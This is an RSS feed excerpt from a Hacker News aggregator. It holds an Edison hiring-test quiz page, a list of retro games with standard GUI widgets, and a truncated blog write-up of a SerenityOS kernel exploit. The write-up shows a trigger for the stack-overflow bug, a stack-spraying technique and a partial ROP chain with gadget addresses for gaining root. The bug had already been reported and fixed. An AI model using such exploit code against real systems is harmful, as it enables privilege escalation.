<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-root"><div id="masterPage"><main id="PAGES_CONTAINER" tabindex="-1"><div id="SITE_PAGES"><div><div id="czg7j"><div><div id="Containerczg7j"><div data-mesh-id="Containerczg7jinlineContent" data-testid="inline-content"><div data-mesh-id="Containerczg7jinlineContent-gridContainer" data-testid="mesh-container-content"><div id="comp-j9ihpqif"><div data-mesh-id="comp-j9ihpqifinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihpqifinlineContent-gridContainer" data-testid="mesh-container-content"><p id="comp-j9iicn2b" data-testid="richTextElement"><h4><span>Thomas Edison Test:&nbsp;Hiring Process</span></h4></p></div></div></div><p id="comp-j9iis0gn" data-testid="richTextElement"><h6>During Edison's hiring process, he had certain criteria all&nbsp;applicants had to pass. He created a 146 questionare that every&nbsp;candidate had to take in order to be hired as one of Thomas Edison's workers. Below are examples of questions that were on the Intelligence test.</h6></p><p id="comp-j9ij3cf6" data-testid="richTextElement"><h6><span><span>Drag your mouse over the grey boxes for the answers to be revealed.</span></span></h6></p><div id="comp-j9hgl9ty" data-mode="default"><div><div data-mesh-id="comp-j9hgl9tyinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9hgl9tyinlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p><span>&nbsp;Spain, Andorra, Monaco, Switzerland, Germany, Luxemburg and Belgium</span></p><p id="comp-j9hguu4d" data-testid="richTextElement"><h2><span><span>1</span>.<span><span>What countries bound France?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihp6sg" data-mode="default"><div><div data-mesh-id="comp-j9ihp6sginlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihp6sginlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p id="comp-j9ihp6t2" data-testid="richTextElement"><h2><span><span>10</span>.<span>Where is Copenhagen?</span></span></h2></p></div></div></div></div><div id="comp-j9ihpa13" data-mode="default"><div><div data-mesh-id="comp-j9ihpa13inlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihpa13inlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><div id="comp-j9ihpa1h" data-testid="richTextElement"><p><span>The first signer of the&nbsp;</span></p>

<p><span>Declaration of Independence.</span></p></div><p id="comp-j9ihpa1k" data-testid="richTextElement"><h2><span><span>18</span>.<span><span>Who was John Hancock?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihz3hx" data-mode="default"><div><div data-mesh-id="comp-j9ihz3hxinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihz3hxinlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><div id="comp-j9ihz3ih" data-testid="richTextElement">

<p><span><span>The&nbsp;Spanish conqueror of Peru</span></span></p></div><p id="comp-j9ihz3ik" data-testid="richTextElement"><h2><span><span>26</span>.<span><span>Who is Pizarro?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihyxl2" data-mode="default"><div><div data-mesh-id="comp-j9ihyxl2inlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihyxl2inlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p id="comp-j9ihyxlw" data-testid="richTextElement"><h2><span><span>39.</span><span><span>What is the capital of Pennsylvania?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihz02e" data-mode="default"><div><div data-mesh-id="comp-j9ihz02einlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihz02einlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><div id="comp-j9ihz036" data-testid="richTextElement"><p><span>Mergenthaler was the first to</span></p>

<p><span>perfect a highly&nbsp;</span><span>practical one.</span></p></div><p id="comp-j9ihz039" data-testid="richTextElement"><h2><span><span>52</span>.<span><span>Who invented the typesetting machine?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihyvbr" data-mode="default"><div><div data-mesh-id="comp-j9ihyvbrinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihyvbrinlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p id="comp-j9ihyvcd" data-testid="richTextElement"><h2><span><span>63</span>.<span>Who reached the south pole</span><span><span>?</span></span></span></h2></p></div></div></div></div><div id="comp-j9ihpesy" data-mode="default"><div><div data-mesh-id="comp-j9ihpesyinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihpesyinlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p><span><span>Cyanide of potassium, strychnine and arsenic.</span></span></p><p id="comp-j9ihpetg" data-testid="richTextElement"><h2><span><span>83.</span></span><span><span>Name three powerful poisons.</span></span></h2></p></div></div></div></div><div id="comp-j9ihph4s" data-mode="default"><div><div data-mesh-id="comp-j9ihph4sinlineContent" data-testid="inline-content"><div data-mesh-id="comp-j9ihph4sinlineContent-gridContainer" data-testid="mesh-container-content"><p><span><span>Share the amazing things customers are saying about your business. Double click, or click Edit Text to make it yours.</span></span></p><p id="comp-j9ihph59" data-testid="richTextElement"><h2><span><span>101</span>.<span><span>Who invented the cotton gin?</span></span></span></h2></p></div></div></div></div><p id="comp-j9iiq1g7" data-testid="richTextElement"><h6>Want to try and answer all 146 questions? Download the PDF below. Questions and answers availible.</h6></p></div></div></div></div></div></div></div></main></div></div></div>]]>
            </description>
            <link>https://www.thomasedison.org/thomas-edison-hiring-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366056</guid>
            <pubDate>Sat, 06 Mar 2021 08:38:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Video games that use standard GUI widgets (2020)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26366034">thread link</a>) | @networked
<br/>
March 6, 2021 | https://dbohdan.com/wiki/gui-games | <a href="https://web.archive.org/web/*/https://dbohdan.com/wiki/gui-games">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>There is something charming about games using their desktop platform's standard windows and controls for the user interface.  It is even more so if they use the limited standard palette.  This page tries to convey their charm.</p>

<p>The release dates are for the initial release of the game unless indicated otherwise.</p>

<h2>Contents</h2>
<h2>A-Train (Macintosh, 1992)</h2>
<p><img loading="lazy" width="739" height="509" src="https://dbohdan.com/doc/tip/media/standard-widget-games/a-train.png"></p>

<p>Screenshot credit: Macintosh Garden.</p>

<h2>Ballistic (Windows 3.x, 1994)</h2>
<p><img loading="lazy" width="394" height="449" src="https://dbohdan.com/doc/tip/media/standard-widget-games/ballistic-01.gif">
<img loading="lazy" width="394" height="449" src="https://dbohdan.com/doc/tip/media/standard-widget-games/ballistic-02.gif"></p>

<p>Screenshot credit: <a href="http://www.win3x.org/win3board/viewtopic.php?t=24717">valso518 on win3x.org</a>.</p>

<h2>Bang! Bang! (Windows 3.x, 1990)</h2>
<p><img loading="lazy" width="514" height="449" src="https://dbohdan.com/doc/tip/media/standard-widget-games/bangbang-01.png">
<img loading="lazy" width="514" height="449" src="https://dbohdan.com/doc/tip/media/standard-widget-games/bangbang-02.png"></p>

<p>Screenshot credit: myself.</p>

<h2>Blob Factory v1.1 (Windows 3.x, 1996)</h2>
<p><img loading="lazy" width="258" height="232" src="https://dbohdan.com/doc/tip/media/standard-widget-games/blobfact-01.png">
<img loading="lazy" width="615" height="269" src="https://dbohdan.com/doc/tip/media/standard-widget-games/blobfact-02.png"></p>

<p>Screenshot credit: myself.</p>

<h2>Bow and Arrow (Windows 3.x, 1992)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/bow-and-arrow.png"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/win3x/bow-and-arrow/screenshots/gameShotId,969536/">JudgeDeadd on MobyGames</a>.</p>

<h2>Breadbox Ensemble games (Breadbox Ensemble, 2002)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/breadbox-ensemble-01.png">
<img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/breadbox-ensemble-02.png"></p>

<p>Screenshot credit: <a href="http://toastytech.com/guis/bbe2.html">ToastyTech</a>, WinWorld.</p>

<h2>Castle of the Winds II: Lifthransir's Bane (Windows 3.x, 1994)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/castle-of-the-winds-ii.png"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/win3x/castle-of-the-winds-ii-lifthransirs-bane/screenshots/gameShotId,881711/">moditorsen on MobyGames</a>.</p>

<h2>Chip's Challenge (Windows 3.x, 1992)</h2>
<p><img loading="lazy" width="520" height="397" src="https://dbohdan.com/doc/tip/media/standard-widget-games/chips-challenge.png"></p>

<p>Screenshot credit: myself.</p>

<h2>Colony, The (Macintosh, 1988)</h2>
<p><img loading="lazy" width="640" height="481" src="https://dbohdan.com/doc/tip/media/standard-widget-games/colony-01.png">
<img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/colony-02.png">
<img loading="lazy" width="568" height="469" src="https://dbohdan.com/doc/tip/media/standard-widget-games/colony-03.png"></p>

<p>Screenshot credit: Macintosh Garden.</p>

<h2>Combat Tanks (Windows 3.x, 1994)</h2>
<p><img loading="lazy" width="482" height="466" src="https://dbohdan.com/doc/tip/media/standard-widget-games/combat-tanks.gif"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/win3x/combat-tanks/screenshots/gameShotId,12577/">Brolin Empey on MobyGames</a>.</p>

<h2>DopeWars OS X (macOS, 2003)</h2>
<p><img loading="lazy" width="700" height="536" src="https://dbohdan.com/doc/tip/media/standard-widget-games/dopewars-os-x.jpg"></p>

<p>Screenshot credit: <a href="http://dopewarsx.com/">official website</a>.</p>

<h2>Drain Storm (Windows 3.x, 1997)</h2>
<p><img loading="lazy" width="632" height="440" src="https://dbohdan.com/doc/tip/media/standard-widget-games/drain-storm-01.gif"></p>

<p>Screenshot credit: unknown.</p>

<h2>Exile III: Ruined World (Macintosh, 1997)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/exile-iii.png"></p>

<p>Screenshot credit: Macintosh Garden.</p>

<h2>Fractal Fighters (Windows 9x/NT, 1997)</h2>
<p><img loading="lazy" width="799" height="486" src="https://dbohdan.com/doc/tip/media/standard-widget-games/fracfit-01.png">
<img loading="lazy" width="799" height="486" src="https://dbohdan.com/doc/tip/media/standard-widget-games/fracfit-02.png"></p>

<p>Screenshot credit: unknown.</p>

<h2>GopherGolf (Windows 9x/NT, 1996)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/gopher-golf.png"></p>

<p>Screenshot credit: myself.</p>

<h2>Incredible Machine 2, The (Windows 9x/NT, 1995)</h2>
<p><img loading="lazy" width="806" height="584" src="https://dbohdan.com/doc/tip/media/standard-widget-games/incredible-machine-2.png"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/windows/incredible-machine-2/screenshots/gameShotId,137637/">ixfd64 on MobyGames</a>.</p>

<h2>Konquest (initially <em>GNU-Lactic Conquest</em>, KDE, 1998?)</h2>
<p><img loading="lazy" width="608" height="692" src="https://dbohdan.com/doc/tip/media/standard-widget-games/konquest.png"></p>

<p>Screenshot credit: <a href="https://commons.m.wikimedia.org/wiki/File:Konquest.png">Adam1213 at English Wikipedia</a>.</p>

<h2>Sid Meier's Civilization</h2>
<h3>Macintosh (1993)</h3>
<p><img loading="lazy" width="800" height="600" src="https://dbohdan.com/doc/tip/media/standard-widget-games/civ-mac.png"></p>

<h3>Windows 3.x (1993)</h3>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/civ-win3x.png"></p>

<p>Screenshot credit: <a href="https://www.oldgames.sk/en/gallery.php?gallery=158">DJ OldGames</a>.</p>

<h2>SimCity</h2>
<h3>NeWS GUI on SunOS (1992)</h3>
<p><img loading="lazy" width="1152" height="900" src="https://dbohdan.com/doc/tip/media/standard-widget-games/simcity-news.gif"></p>

<h3>Tk X11 GUI on SunOS (1993)</h3>
<p><img loading="lazy" width="1152" height="900" src="https://dbohdan.com/doc/tip/media/standard-widget-games/simcity-sun.gif"></p>

<h3>Windows 3.x (1992)</h3>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/simcity-win3x.png"></p>

<p>Screenshot credit: Don Hopkins (whose website is currently defunct), <a href="https://www.mobygames.com/game/win3x/simcity/screenshots/gameShotId,77448/">Yannick Bertrand on MobyGames</a>.</p>

<h2>SimTower: The Vertical Empire (Windows 3.x, 1994)</h2>
<p><img loading="lazy" width="800" height="600" src="https://dbohdan.com/doc/tip/media/standard-widget-games/simtower-01.png">
<img loading="lazy" width="800" height="600" src="https://dbohdan.com/doc/tip/media/standard-widget-games/simtower-02.png"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/win3x/simtower-the-vertical-empire/screenshots/gameShotId,440236/">Hammerlore on MobyGames</a>.</p>

<h2>Space Trader (PalmOS, 2000)</h2>
<p><img loading="lazy" width="160" height="160" src="https://dbohdan.com/doc/tip/media/standard-widget-games/space-trader-01.gif">
<img loading="lazy" width="160" height="160" src="https://dbohdan.com/doc/tip/media/standard-widget-games/space-trader-02.gif">
<img loading="lazy" width="160" height="160" src="https://dbohdan.com/doc/tip/media/standard-widget-games/space-trader-03.gif"></p>

<p>Screenshot credit: <a href="http://www.spronck.net/spacetrader/STScreenshots.html">official website</a>.</p>

<h2>Star Wars: Yoda Stories (Windows 9x/NT, 1997)</h2>
<p><img loading="lazy" width="525" height="360" src="https://dbohdan.com/doc/tip/media/standard-widget-games/star-wars-yoda-stories-01.gif">
<img loading="lazy" width="525" height="360" src="https://dbohdan.com/doc/tip/media/standard-widget-games/star-wars-yoda-stories-02.gif"></p>

<p>Screenshot credit: <a href="https://adventuregamers.com/games/view/16364">Adventure Gamers</a>.</p>

<h2>Toppler (Windows 3.x, 1995)</h2>
<p><img loading="lazy" width="640" height="480" src="https://dbohdan.com/doc/tip/media/standard-widget-games/toppler.png"></p>

<p>Screenshot credit: <a href="https://www.mobygames.com/game/win3x/toppler/screenshots/gameShotId,897895/">POMAH on MobyGames</a>.</p>

<h2>XEvil (GNU/Linux, 1994?)</h2>
<p><img loading="lazy" width="978" height="662" src="https://dbohdan.com/doc/tip/media/standard-widget-games/xevil.gif"></p>

<p>Screenshot credit: <a href="http://www.xevil.com/">official website</a>.</p>

<hr>

<p><a href="https://dbohdan.com/wiki/special:tags">Tags</a>: list, UI/UX, video games.</p>

</div></div>]]>
            </description>
            <link>https://dbohdan.com/wiki/gui-games</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366034</guid>
            <pubDate>Sat, 06 Mar 2021 08:31:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Kernel Hacking Adventures]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26365966">thread link</a>) | @ingve
<br/>
March 6, 2021 | https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/ | <a href="https://web.archive.org/web/*/https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Memory corruption to root privileges.</p><div>
        <p><img src="https://styles.redditmedia.com/t5_11p1s4/styles/communityIcon_82qz1x1k5uj41.png" alt="SerenityOS Logo"></p>

<p>Recently I have taken an interest in a project called SerenityOS. Stolen straight from the <a href="https://github.com/SerenityOS/serenity">GitHub</a>:</p>
<blockquote>
<p>SerenityOS is a love letter to ’90s user interfaces with a custom Unix-like core. It flatters with sincerity by stealing beautiful ideas from various other systems.</p>
<p>Roughly speaking, the goal is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by us, for us, based on the things we like.</p>
</blockquote>
<p>It’s a surprisingly featured hobby operating system with quite a welcoming community behind it. It caught my radar after a series of videos by LiveOverflow and Andreas (the developer) detailing a few exploits made during the <a href="https://hxp.io/blog/79/hxp-CTF-2020-wisdom2/">2020 hxp CTF</a>, so I decided to explore the system myself. Eventually, I found a memory corruption bug in some networking code that could be leveraged into kernel-mode code execution.</p>

<p>The vulnerability can be hit so easily by some bad code that I’m surprised it wasn’t found by a fuzzer immediately. At its core, it’s a stack overflow in the function <code>TCPSocket::send_tcp_packet</code>. To see how, let’s take a look at the implementation.</p>
<div><pre><code data-lang="cpp">KResult TCPSocket<span>::</span>send_tcp_packet(u16 flags, <span>const</span> UserOrKernelBuffer<span>*</span> payload, size_t payload_size)
{
    <span>const</span> size_t buffer_size <span>=</span> <span>sizeof</span>(TCPPacket) <span>+</span> payload_size;
    <span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
    <span>new</span> (buffer) TCPPacket;
    <span>auto</span><span>&amp;</span> tcp_packet <span>=</span> <span>*</span>(TCPPacket<span>*</span>)(buffer);
    ASSERT(local_port());
    tcp_packet.set_source_port(local_port());
    tcp_packet.set_destination_port(peer_port());
    tcp_packet.set_window_size(<span>1024</span>);
    tcp_packet.set_sequence_number(m_sequence_number);
    tcp_packet.set_data_offset(<span>sizeof</span>(TCPPacket) <span>/</span> <span>sizeof</span>(u32));
    tcp_packet.set_flags(flags);
    <span>//...
</span><span></span>    <span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
        <span>return</span> EFAULT;
    <span>//...
</span><span></span>    <span>if</span> (tcp_packet.has_syn() <span>||</span> payload_size <span>&gt;</span> <span>0</span>) {
        <span>//...
</span><span></span>        send_outgoing_packets();
        <span>return</span> KSuccess;
    }
    <span>//...
</span><span></span>}
</code></pre></div><p>This function is called when attempting to use the <code>send()</code> syscall on a TCP socket (naturally). None of the parent callers in the chain (<code>Process::sys$sendmsg</code>, <code>IPv4Socket::sendto</code>, and <code>TCPSocket::protocol_send</code>) do any bounds checking on the user-provided <code>payload_size</code> other than ensuring the value is in userspace. Unfortunately, a value being in userspace is quite a lax requirement when then using the value to make a stack allocation. The problem line is:</p>
<div><pre><code data-lang="cpp"><span>alignas</span>(TCPPacket) u8 buffer[buffer_size];
</code></pre></div><p><code>buffer</code> is then a Variable-length Array (<a href="https://en.wikipedia.org/wiki/Variable-length_array">VLA</a>) which is a really cursed feature from C99 that is as bad as it sounds. It attempts to dynamically resize the stack-frame using the value we provided, which can do some very unexpected things when the value is larger than the stack size (Serenity seems to use a stack size of 2^16 in the kernel). We can thus easily obliterate the stack and trigger a crash by calling something to the effect of:</p>
<div><pre><code data-lang="cpp">send(tcp_socket, user_buffer, <span>0xdeadaa</span>, <span>0</span>); <span>//BOOM!
</span></code></pre></div><p>This is all well and good, but can we actually do something useful with this? First and foremost, we need to make sure there’s no funny business going on with the allocation itself. Examining the code produced by gcc:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+749</span><span>&gt;:</span> test   eax,eax
<span>&lt;</span><span>+751</span><span>&gt;:</span> jg     <span>0xc018a36f</span> <span>&lt;</span>Kernel<span>::</span>TCPSocket<span>::</span><span>send_tcp_packet</span>(unsigned short, Kernel<span>::</span>UserOrKernelBuffer const<span>*</span>, unsigned long)<span>+771</span><span>&gt;</span>
<span>&lt;</span><span>+753</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+754</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+755</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+756</span><span>&gt;:</span> lea    eax,[ebx<span>+0</span>x1c3be4]
<span>&lt;</span><span>+762</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+763</span><span>&gt;:</span> call   <span>0xc01e08e2</span> <span>&lt;</span><span>__ubsan_handle_vla_bound_not_positive</span>()<span>&gt;</span>
<span>&lt;</span><span>+768</span><span>&gt;:</span> add    esp,<span>0x10</span>
<span>&lt;</span><span>+771</span><span>&gt;:</span> mov    eax,DWORD PTR [ebp<span>-0</span>x70]
<span>&lt;</span><span>+774</span><span>&gt;:</span> lea    esi,[ebp<span>-0</span>x58]
<span>&lt;</span><span>+777</span><span>&gt;:</span> add    eax,<span>0xf</span>
<span>&lt;</span><span>+780</span><span>&gt;:</span> and    eax,<span>0xfffffff0</span>
<span>&lt;</span><span>+783</span><span>&gt;:</span> sub    esp,eax
<span>&lt;</span><span>+785</span><span>&gt;:</span> lea    eax,[ebp<span>-0</span>x70]
<span>...</span>
</code></pre></div><p>Seems to do exactly as advertised, just a <code>sub esp</code> with our value (and with the shiny UB sanitizer attached). So now that we can be confident the allocation won’t mess with any memory, the next step is using it safely. Nearly right after the allocation, we have our userspace buffer being copied into the kernel buffer:</p>
<div><pre><code data-lang="cpp"><span>if</span> (payload <span>&amp;&amp;</span> <span>!</span>payload<span>-&gt;</span>read(tcp_packet.payload(), payload_size))
    <span>return</span> EFAULT;
</code></pre></div><p>This could be bad news for us <em>if</em> we provide a valid-sized user buffer because then we’d at the very least hit the guard page below the stack and fail. But that’s a big <em>if</em>. Providing a non-valid user buffer is totally fair game, too. How would the kernel know? What I mean by this is that our buffer isn’t as long as we say it is. The result is that as <code>payload-&gt;read</code> attempts to copy over our bytes, it’ll fault when it hits our bad memory. But this time, the fault will be on the <em>user side</em>, meaning the function will gracefully exit on the kernel’s end.</p>
<div><pre><code data-lang="cpp">u8<span>*</span> stack_smash <span>=</span> (u8<span>*</span>)mmap(<span>nullptr</span>, ST_BUFFER_LEN, PROT_READ <span>|</span> PROT_WRITE, MAP_SHARED <span>|</span> MAP_ANONYMOUS, <span>-</span><span>1</span>, <span>0</span>);
...
send(socket_fd, stack_smash, send_len, <span>0</span>); <span>//send_len is much, much larger than ST_BUFFER_LEN!
</span></code></pre></div><p><a href="https://twitter.com/patrickwardle">@patrickwardle</a> has a nice visual of this regarding a similar idea on macOS:</p>
<p><img src="https://pbs.twimg.com/media/EvYgh2MVIAYT_8I?format=jpg&amp;name=large" alt="macOS partial write"></p>
<p>This is wonderful, as this chain of events means we have:</p>
<ul>
<li>A <code>sub esp</code> with a user-controlled value</li>
<li>An arbitrary write with another user-controlled value/length</li>
<li>A graceful exit</li>
</ul>
<p>I reported the <a href="https://github.com/SerenityOS/serenity/issues/5310">issue</a> and it was fixed within 15 minutes. This guy is a beast!</p>
<p>Now we have all the tools necessary to exploit this :)</p>

<p>We have essentially what is an arbitrary write primitive, so first we must choose what we want to write to. We have to keep in mind that we are writing from an offset from the stack, though, which might make things a little unpredictable. Thankfully, there is little to no KASLR on the system (as far as I’ve seen) but general system noise and randomness make specific writes fairly difficult. That makes directly writing to a critical structure out of the question, but what about staying in the realm of the stack? As the bug is a stack overflow we can’t write to anything already on our stack (as it continues to grow downwards), but I did notice the offsets between stacks seems to remain constant:</p>
<div><pre><code data-lang="cs">...
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35df000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc35f0000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3601000
<span>[#0 SystemServer(5:5)]</span>: Created kernel stack: <span>0</span>xc3612000
...
</code></pre></div><p>The offset is 0x11000, which is just the stack size 0x10000 plus the guard page size 0x1000. And so, if we can’t write to our own stack… we can still write to another process stack fairly reliably. It then just becomes a case of winning a race condition between what the other process is doing and the write that we do. This is not a problem however as we control the ‘victim’ process, so we can just make it do something as trivial as call sleep, giving us an arbitrary race window. There is also one final annoyance of some randomization that is done whenever we call a syscall:</p>
<div><pre><code data-lang="cpp"><span>// Apply a random offset in the range 0-255 to the stack pointer,
</span><span>// to make kernel stacks a bit less deterministic.
</span><span>// Since this is very hot code, request random data in chunks instead of
</span><span>// one byte at a time. This is a noticeable speedup.
</span><span></span><span>if</span> (g_random_byte_buffer_offset <span>==</span> RandomByteBufferSize) {
    get_fast_random_bytes(g_random_byte_buffer, RandomByteBufferSize);
    g_random_byte_buffer_offset <span>=</span> <span>0</span>;
}
</code></pre></div><p>This slight randomization to the stack bases makes writing to an exact address of the victim’s stack unreliable (granted, it could be brute-forced in a millisecond). But once again the stars align as the sleep syscall does not care very much about how the stack is laid out as it returns. During its call, it eventually reaches the function <code>Processor::switch_context</code>, which is the final stage before swapping contexts. In it, it does:</p>
<div><pre><code data-lang="r"><span>...</span>
<span>&lt;</span><span>+159</span><span>&gt;:</span> pushf  
<span>&lt;</span><span>+160</span><span>&gt;:</span> push   ebx
<span>&lt;</span><span>+161</span><span>&gt;:</span> push   esi
<span>&lt;</span><span>+162</span><span>&gt;:</span> push   edi
<span>&lt;</span><span>+163</span><span>&gt;:</span> push   ebp
<span>...</span>
<span>&lt;</span><span>+186</span><span>&gt;:</span> push   eax
<span>&lt;</span><span>+187</span><span>&gt;:</span> push   edx
<span>&lt;</span><span>+188</span><span>&gt;:</span> push   ecx
<span>&lt;</span><span>+189</span><span>&gt;:</span> cld    
<span>&lt;</span><span>+190</span><span>&gt;:</span> jmp    <span>0xc011b7d4</span> <span>&lt;</span><span>enter_thread_context</span>()<span>&gt;</span>
<span>&lt;</span><span>+195</span><span>&gt;:</span> pop    edx
<span>&lt;</span><span>+196</span><span>&gt;:</span> pop    eax
<span>&lt;</span><span>+197</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+198</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+199</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+200</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+201</span><span>&gt;:</span> popf   
<span>...</span>
<span>&lt;</span><span>+225</span><span>&gt;:</span> lea    esp,[ebp<span>-0</span>xc]
<span>&lt;</span><span>+228</span><span>&gt;:</span> pop    ebx
<span>&lt;</span><span>+229</span><span>&gt;:</span> pop    esi
<span>&lt;</span><span>+230</span><span>&gt;:</span> pop    edi
<span>&lt;</span><span>+231</span><span>&gt;:</span> pop    ebp
<span>&lt;</span><span>+232</span><span>&gt;:</span> ret    
<span>...</span>
</code></pre></div><p>Pretty much saving the state and restoring it afterwards. Crucially, it loads <code>esp</code> with a value on the stack, then returns shortly after. Accuracy doesn’t matter here, we can just spray the stack with a new stack pointer and have it return from there… code execution! At this point, we just need to put a ROP chain in some kernel memory and have the stack be redirected to there. I chose to just spray some heap memory with the ROP, but this part was extremely iffy. The offset between the current stack and the heap is not something I could reasonably predict so I had to pretty much blast the entire heap with the code. I used something like a nop sled but with a bunch of rets instead (a ret sled?) to make the ROP chain execution reliable but it would still crash half the time if the offset was too large and I wrote to some bad memory. There’s probably a better way to store the ROP but for my purposes, it will suffice.</p>
<p>The ROP chain I ended up with was very similar to the one in vakzz’s awesome <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">exploit chain</a>, writing root to our processes permission bits.</p>
<div><pre><code data-lang="cpp">write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157c1e</span>); <span>//pop eax; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811000</span>); <span>//heap
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc02289ef</span>); <span>//Kernell::process::current()
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc019092e</span>); <span>//mov dw [eax], edx; ret;
</span><span></span>
pad(heap_smash, <span>&amp;</span>off, <span>0x41414141</span>);       <span>//stack padding
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0157cec</span>); <span>//pop edi; pop ebp; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0811018</span>); <span>//heap+0x18 
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000000</span>); <span>//dummy 
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc0195672</span>); <span>//call dw [edi - 0x18]; ret;
</span><span></span>
write_u32(heap_smash, <span>&amp;</span>off, <span>0xc011ccdc</span>); <span>//pop edx; ret;
</span><span></span>write_u32(heap_smash, <span>&amp;</span>off, <span>0x00000038</span>); <span>//uid offset
</span><span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/">https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</a></em></p>]]>
            </description>
            <link>https://abigpickle.github.io/posts/2021/03/serenityos-kernel-hacking-adventures/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26365966</guid>
            <pubDate>Sat, 06 Mar 2021 08:09:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finding Mona Lisa in the Game of Life – with JAX]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26365806">thread link</a>) | @atulvi
<br/>
